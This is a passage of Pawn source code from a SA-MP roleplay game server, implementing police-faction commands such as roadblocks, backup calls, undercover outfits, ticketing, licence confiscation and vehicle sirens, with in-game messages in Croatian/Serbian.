				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		        GetPlayerPos( playerid, plocx, plocy, plocz);
		        GetPlayerFacingAngle( playerid,ploca);
		        CreateRoadblock(1425,plocx,plocy,plocz+0.6,ploca);
		        GameTextForPlayer( playerid,"~w~Znak usmjeravanja ~g~postavljen!",3000,1);
				return 1;
			}
			else if(rb == 5)
			{
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		        GetPlayerPos( playerid, plocx, plocy, plocz);
		        GetPlayerFacingAngle( playerid,ploca);
		        CreateRoadblock(3265,plocx,plocy,plocz-0.5,ploca);
		        GameTextForPlayer( playerid,"~w~Znak upozorenja ~g~postavljen!",3000,1);
				return 1;
			}
			else if(rb == 6)
			{
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		        GetPlayerPos( playerid, plocx, plocy, plocz);
		        GetPlayerFacingAngle( playerid,ploca);
		        CreateRoadblock(3091,plocx,plocy,plocz+0.5,ploca+180);
		        GameTextForPlayer( playerid,"~w~Blokada usmjeravanja ~g~postavljena!",3000,1);
				return 1;
			}
        } else SCM( playerid, BELA, "Nisi Rank 3!");
	} else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    return 1;
}

CMD:rrb( playerid, params[] ) {
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	if( PlayerInfo[ playerid ][ xRank ] >= 3 )
	{
   		DeleteClosestRoadblock( playerid );
       	GameTextForPlayer( playerid, "~w~Roadblock ~r~Removed!", 3000, 1 );
	}
	else
  		SendErrorMessage( playerid, "Nisi Rank 3!" );
    return 1;
}

CMD:removeall( playerid, params[] ) {
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
   	DeleteAllRoadblocks( playerid );
    for( new id = 1; id < MAX_ORG; id++) {
		if( OI[ id ][ oTip ] == ORG_TIP_PD ) {
			format( globalstring,sizeof( globalstring ),"HQ: Officer %s je maknuo sve blokade u ovom podrucju, over.", ImeIgraca( playerid ) );
		   	OrgPoruka( id, 0x2641FEAA, globalstring );
		}
	}
	GameTextForPlayer( playerid, "~b~All ~w~Roadblocks ~r~Removed!", 3000, 1 );
    return 1;
}

CMD:bk( playerid, params[] ) {
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( GetPVarInt( playerid, "RequestingBackup" ) != 1 ) {
    
		format( globalstring, sizeof( globalstring ), "SVE JEDINICE: %s trazi pojacanje i oznacen je na GPSu (crveno).", ImeIgraca( playerid ) );
		SetPVarInt( playerid, "RequestingBackup", 1);
		
		new Float:Pos[ 3 ];
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		foreach( Player, i ) {
			if( IsPlayerConnected( i ) ) {
				if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
					Novi_SetPlayerCheckpoint( i, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 5.0 );
					CheckpointStatus[ i ] = 15;
					SCM( i, 0x8D8DFF00, globalstring );
				}
			}
		}
		SCM( playerid, 0x8D8DFF00, "Ukucajte /bkc da bi ste izbrisali pojacanje." );
		backuptimer[ playerid ] = SetTimerEx( "BackupClear", 180000, false, "ii", playerid, 1 );
	} else SCM( playerid, CRVENA, "Vec imate aktivan zahtev za pojacanje!");
	return 1;
}

CMD:bkc( playerid, params[] ) {
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	BackupClear( playerid, 0 );
	return 1;
}

CMD:govrepair( playerid, params[] ) {
    
    new vehicleid = GetPlayerVehicleID( playerid );
    if( GetPVarInt( playerid, "Kladjenje") == 1) return SendErrorMessage( playerid, "Ne mozete spamati sa ovom komandom! Iskoristavanje komande = ban!");
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" ); 

	if( IsPlayerInRangeOfPoint( playerid, 5.0, 1536.3444,-1489.8959,13.6331 ) || IsPlayerInRangeOfPoint( playerid, 5.0, 1134.1757,-1350.2944,6.0208 ) ) {
		Novi_RepairVehicle( playerid, vehicleid );
		Novi_SetVehicleHealth( vehicleid, 1000.0 );
		antiCheatCS[ playerid ][ VehRepairTime ] = 3;
        Fuel[ vehicleid ] = 100;
        FuelTime[ vehicleid ] = 0;
        SCM( playerid, SVETLOPLAVA, "Vase vozilo je popravljeno i napunjeno gorivom.");
		SetPVarInt( playerid, "Kladjenje", 1);
		SetTimerEx("KSpam", 30000, 0, "d", playerid);
	} else SendErrorMessage( playerid, "Niste na mjestu za popravak vozila!" );
	return 1;
}

CMD:undercover( playerid, params[] ) {
	new id = PlayerInfo[ playerid ][ xClan ];
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( !IsPlayerInRangeOfPoint( playerid, 2.0, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti na pickupu za koriscenje ove komande.");
	if( PlayerInfo[ playerid ][ xRank ] < 3 ) return SendErrorMessage( playerid, "Morate biti rank 3+." );
	new opcija[12],item;
	if( sscanf( params, "s[12]i", opcija, item ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	    SendUsageMessage( playerid, "/undercover skin [skin id(1-11)]");
		SCM( playerid, BELA, "ILI /undercover oruzje [weapon set(1-3)]");
	    SCM( playerid, BELA, "SET 1: Silence Gun, Spraycan, Parachute");
		SCM( playerid, BELA, "SET 2: Desert Deagle, MP5, Country Rifle");
		SCM( playerid, BELA, "SET 3: Silence Gun, Sniper Rifle, Parachute, Knife");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( opcija, "skin", true ) == 0 ) {
		if( item == 1 ) {
			PostaviSkin( playerid, 21 );
			
			SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
	        format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
	   	    PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
		}
		if( item == 2 ) {
			PostaviSkin( playerid, 211 );
			
			SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
	        format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
	   	    PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
		}
		if( item == 3 ) {
			PostaviSkin( playerid, 101 );
			
			SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
	        format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
	        PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
		}
		if( item == 4 ) {
			PostaviSkin( playerid, 183 );
			
			SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
	        format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
	        PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
		}
		if( item == 5 ) {
			PostaviSkin( playerid, 185 );
			
			SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
	        format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
	        PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
		}
		if( item == 6 ) {
			PostaviSkin( playerid, 217 );
			
			SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
	        format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
	        PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
		}
        if( item == 7 ) {
            PostaviSkin( playerid, 299 );
            
            SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
            format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
            PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
        }
        if( item == 8 ) {
            PostaviSkin( playerid, 289 );
            
            SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
            format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
            PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
        }
        if( item == 9 ) {
            PostaviSkin( playerid, 186 );
            
            SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
            format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
            PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
        }
        if( item == 10 ) {
            PostaviSkin( playerid, 177 );
            
            SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
            format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
            PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
        }
        if( item == 11 ) {
            PostaviSkin( playerid, 33 );
            
            SCM( playerid, SVETLOPLAVA, "* Presvukli ste se i sada vas nitko nece moci prepoznati.");
            format( globalstring, sizeof( globalstring ), "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
            PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
        }
	}
	else if( strcmp( opcija, "oruzje", true ) == 0 ) {
		if( item == 1) {
			GiveWeaponToPlayer( playerid, 23,100 );
			GiveWeaponToPlayer( playerid, 41,500 );
			GiveWeaponToPlayer( playerid, 46,1 );
		}
		if( item == 2) {
        	GiveWeaponToPlayer( playerid, 24,100 );
            GiveWeaponToPlayer( playerid, 29,200 );
            GiveWeaponToPlayer( playerid, 33,50 );
		}
		if( item == 3 ) {
        	GiveWeaponToPlayer( playerid, 23, 100 );
            GiveWeaponToPlayer( playerid, 34, 100 );
            GiveWeaponToPlayer( playerid, 46, 1 );
            GiveWeaponToPlayer( playerid, 4, 1 );
		}
	}
    SetPVarInt( playerid, "OfficerUndercover", 1);
    return 1;
}

CMD:ram( playerid, params[] ) {
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	for( new i = 1; i < MAX_IMOVINA; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 2.0, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) ) {
			Novi_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
		  	GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		    SetCameraBehindPlayer( playerid );
		    TogglePlayerControllable( playerid, false );
		   	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
			SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
			inProperty[ playerid ] = i;
		}
	}
	for( new i= 1; i < MAX_ORG; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 2.0, OI[ i ][ oPozExtX ], OI[ i ][ oPozExtY ], OI[ i ][ oPozExtZ ] ) ) {
		    Novi_SetPlayerPos( playerid, OI[ i ][ oPozIntX ], OI[ i ][ oPozIntY ], OI[ i ][ oPozIntZ ] );
		  	GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		   	SetCameraBehindPlayer( playerid );
		    TogglePlayerControllable( playerid, false );
		   	SetPlayerInterior( playerid, OI[ i ][ oInt ] );
			SetPlayerVirtualWorld( playerid, OI[ i ][ oVw ] );
			inOrgInt[ playerid ] = i;
		}
	}
	return true;
}

CMD:take( playerid, params[]) {
	new opcija[20], igrac;
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
    	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
		if( sscanf( params, "s[20]u", opcija, igrac ) ) {
			SCM( playerid, SVETLOPLAVA, "|________________________________________________________|");
			SendUsageMessage( playerid, "/take [ opcija ] [ ID/Deo imena ]");
	  		SCM( playerid, BELA, "Ponudjene opcije: carlicense, bikelicense, c1license, c2license, planelicense");
	  		SCM( playerid, BELA, "Ponudjene opcije: c3license, boatlicense, gunlicense, drugs, weapons");
			SCM( playerid, SVETLOPLAVA, "|________________________________________________________|");
			return 1;
		}
	    if( strcmp( opcija, "carlicense", true ) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's vozacku dozvolu B kategorije.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring );
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo vozacku dozvolu B kategorije.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xVozacka ] = 0;
					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
        else if( strcmp(opcija,"bikelicense",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer(5.0, playerid, igrac)) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s vozacku dozvolu A kategorije.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo vozacku dozvolu A kategorije.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xMotorska ] = 0;
					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"c1license",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's vozacku dozvolu C1 kategorije.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo vozacku dozvolu C1 kategorije.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xKamionskaC1 ] = 0;
					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"c2license",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's vozacku dozvolu C2 kategorije.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo vozacku dozvolu C2 kategorije.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xKamionskaC2 ] = 0;
					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"c3license",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's vozacku dozvolu C3 kategorije.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo vozacku dozvolu C3 kategorije.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xKamionskaC3 ] = 0;
					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"gunlicense",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's dozvolu za oruzje.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo dozvolu za oruzje.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xGunLicense ] = false;
			        } else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"boatlicense",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's dozvolu za plovidbu.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo dozvolu za plovidbu.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xBrodska ] = 0;
			        } else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"planelicense",true) == 0) {
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				        format( globalstring, sizeof( globalstring ), "* Oduzeli ste %s's dozvolu za letenje.", ImeIgraca( igrac ) );
				        SCM( playerid, SVETLOPLAVA, globalstring);
				        format( globalstring, sizeof( globalstring ), "* Policajac %s vam je oduzeo dozvolu za letenje.", ImeIgraca( playerid ) );
				        SCM( igrac, SVETLOPLAVA, globalstring);
				        PlayerInfo[ igrac ][ xLetelica ] = 0;
			        } else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"weapons",true) == 0) {
		    new oruzje = 0, w, a;
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if(IsPlayerNearPlayer( 4.0, playerid, igrac ) ) {

			            for( new i = 0; i < 13; i++) {
							GetPlayerWeaponData(playerid, i, w, a);

							if(w) {
							    oruzje++;
							}
						}

				        SendClientMessageEx( playerid, SVETLOPLAVA, "* Oduzeli ste %s's oruzje.", ImeIgraca( igrac ) );
				        SendClientMessageEx( igrac, SVETLOPLAVA, "* Policajac %s vam je oduzeo oruzje", ImeIgraca( playerid ) );
				        ResetAllWeapons( igrac );
        				PlayerInfo[ playerid ][ xTakenWeps ] += oruzje;
			        } else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		}
		else if(strcmp(opcija,"drugs",true) == 0) {
		    new svedroge = 0;
			if( IsPlayerConnected( igrac ) ) {
			    if( igrac != INVALID_PLAYER_ID ) {
			        if(IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
			            svedroge = PlayerInfo[ igrac ][ xDrug ][ 0 ] + PlayerInfo[ igrac ][ xDrug ][ 1 ] + PlayerInfo[ igrac ][ xDrug ][ 2 ] + PlayerInfo[ igrac ][ xDrug ][ 3 ] + PlayerInfo[ igrac ][ xDrug ][ 4 ];
				        SendClientMessageEx( playerid, SVETLOPLAVA, "* Oduzeli ste %s's svu drogu.", ImeIgraca( igrac ) );
				        SendClientMessageEx( igrac, SVETLOPLAVA, "* Policajac %s vam je oduzeo svu drogu.", ImeIgraca( playerid ) );
						PlayerInfo[ playerid ][ xTakenDrugs ] += svedroge;
						PlayerInfo[ igrac ][ xDrug ][ 0 ] = 0;
						PlayerInfo[ igrac ][ xDrug ][ 1 ] = 0;
						PlayerInfo[ igrac ][ xDrug ][ 2 ] = 0;
						PlayerInfo[ igrac ][ xDrug ][ 3 ] = 0;
						PlayerInfo[ igrac ][ xDrug ][ 4 ] = 0;
						PlayerInfo[ igrac ][ xDrugCode ][ 0 ] = 0;
						PlayerInfo[ igrac ][ xDrugCode ][ 1 ] = 0;
						PlayerInfo[ igrac ][ xDrugCode ][ 2 ] = 0;
						PlayerInfo[ igrac ][ xDrugCode ][ 3 ] = 0;
						PlayerInfo[ igrac ][ xDrugCode ][ 4 ] = 0;
					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije online !");
		} else SendErrorMessage( playerid, "Nepoznato ime za oduzimanje !");
    } else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    return 1;
}

CMD:ticket( playerid, params[] ) {
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	new igrac, moneys, reason[128];
	if(sscanf(params, "uis[128]", igrac, moneys, reason ) ) return SendUsageMessage( playerid, "/ticket [ ID/Deo imena ] [ Cena ] [ razlog ]");
	if(moneys < 1 || moneys > 1000) return SendErrorMessage( playerid, "Cena tiketa ne moze biti manja od 1 i veca od 1000 !");
	if( IsPlayerConnected( igrac ) ) {
	    if( igrac != INVALID_PLAYER_ID ) {
     		if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
     		    if( PlayerInfo[ igrac ][ xNovac ] < moneys) return SendErrorMessage( playerid, "Taj igrac nema toliko novaca !");
				SendClientMessageEx( playerid, SVETLOPLAVA, "* Dali ste %s tiket od $%d, razlog: %s", ImeIgraca( igrac ), moneys, reason );
				SendClientMessageEx( igrac, SVETLOPLAVA, "* Policajac %s vam je dao tiket od $%d, razlog: %s", ImeIgraca( playerid ), moneys, reason );
				SCM( igrac, SVETLOPLAVA, "* Ukucajte /prihvati ticket, da bi ste prihvatili tiket.");
                SetPVarInt( igrac, "TicketOffer", playerid );
				SetPVarInt( igrac, "TicketMoney", moneys );
			} else SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac je Offline !");
	return 1;
}

// CMD:carsign( playerid,params[], help ) {

//     new tekst[ 10 ], carsignstring[ 15 ], Float:x, Float:y, Float:z;
//     if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
//     if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
// 	if( sscanf( params, "s[10]", tekst ) ) return SendUsageMessage( playerid, "/carsign [ Text ]");
//     if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
// 	new vehicleid = GetPlayerVehicleID( playerid );
// 	if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) {
// 	    GetVehiclePos( vehicleid, x, y, z );
// 	    if( CarSign[ vehicleid ] == 0 ) {
// 			SCM( playerid, ZUTA, "Stavio si oznaku na svoje vozilu!");
// 			CarSign[ vehicleid ] = 1;
// 		    format( carsignstring, sizeof( carsignstring ), "%s", tekst );
// 			vehicle3Dtext[ vehicleid ] = Create3DTextLabel( carsignstring, 0xFFFFFFC8, x, y, z, 10.0, 0, 1 );
// 		    Attach3DTextLabelToVehicle( vehicle3Dtext[ vehicleid ] , vehicleid, -0.800000, -2.899999, 0.000000 );
// 		}
// 		else if( CarSign[ vehicleid ] == 1 ) {
// 			SCM( playerid, ZUTA, "Skinuo si oznaku sa svog vozila!");
// 			Delete3DTextLabel( vehicle3Dtext[ vehicleid ] );
// 			CarSign[ vehicleid ] = 0;
// 		}
// 	} else SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u vozilu policije." );
// 	return 1;
// }

CMD:orgstats( playerid, params[] ) {
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    ShowPDStats( playerid, playerid );
    return 1;
}

CMD:siren( playerid, params[] ) {
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
        new type;
        new VID = GetPlayerVehicleID( playerid );
        if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!");
		if( IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne moze sirena na biciklu!");
		if( IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne moze sirena na motor!");
        if( sscanf( params, "d", type))
        {
            SendUsageMessage( playerid, "/siren [Tip]");
            SCM( playerid, BELA, "Tipovi: 1 = unutrasnjost, 2 = krov, 3 = ugasi.");
            return 1;
        }
        switch(type)
        {
        	case 1:
            {
            	if( Siren[ VID ] == 1) return SendErrorMessage( playerid, "Na ovom vozilu je vec postavljena sirena!");
               	Siren[ VID ] = 1;
               	SirenObject[ VID ] = CreateDynamicObject( 18646, 10.0, 10.0, 1500.0, 0, 0, 0 );
               	AttachDynamicObjectToVehicle( SirenObject[ VID ], VID, 0.0, 0.75, 0.275, 0.0, 0.1, 0.0);

                if( Maskuse[ playerid ] == false )
					format( globalstring, sizeof( globalstring ), "* %s stavlja sirenu na plocu s instrumentima.", ImeIgraca( playerid ) );
				else
				    format( globalstring, sizeof( globalstring ), "* Maska_%d stavlja sirenu na plocu s instrumentima.", PlayerInfo[ playerid ][ xMaskID ] );

				format( globalstring, sizeof( globalstring ), "* %s stavlja sirenu na plocu s instrumentima.", ImeIgraca( playerid ) );
                PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
                return 1;
            }
        	case 2:
            {
            	if(Siren[ VID ] == 1) return SendErrorMessage( playerid, "Na ovom vozilu vec' je postavljena sirena!");
                Siren[ VID ] = 1;
                SirenObject[ VID ] = CreateDynamicObject(18646, 10.0, 10.0, 1500.0, 0, 0, 0);
                AttachDynamicObjectToVehicle( SirenObject[ VID ], VID, -0.43, 0.0, 0.785, 0.0, 0.1, 0.0);

                if( Maskuse[ playerid ] == false )
					format( globalstring, sizeof( globalstring ), "* %s stavlja sirenu na krov.", ImeIgraca( playerid ) );
				else
				    format( globalstring, sizeof( globalstring ), "* Maska_%d stavlja sirenu na krov.", PlayerInfo[ playerid ][ xMaskID ] );

                PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
                return 1;
            }
        	case 3:
            {
                if(Siren[ VID ] == 0) return SendErrorMessage( playerid, "Nema ugradjene sirene u ovom vozilu!");
                Siren[ VID ] = 0;
                DestroyDynamicObject( SirenObject[ VID ] );

                if( Maskuse[ playerid ] == false )
					format( globalstring, sizeof( globalstring ), "* %s gasi i mice sirenu.", ImeIgraca( playerid ) );
				else
				    format( globalstring, sizeof( globalstring ), "* Maska_%d gasi i mice sirenu.", PlayerInfo[ playerid ][ xMaskID ] );

                PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
                return 1;
            }
        	default:
            {
                SCM( playerid, CRVENA, "Pogresan tip sirene! /siren [Tip]");
                SCM( playerid, CRVENA, "Tipovi: 1 = Unutrasnjost, 2 = Krov, 3 = Ugasi.");
            }
        }
    }
    else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    return 1;
}

CMD:suspend( playerid, params[] ) {

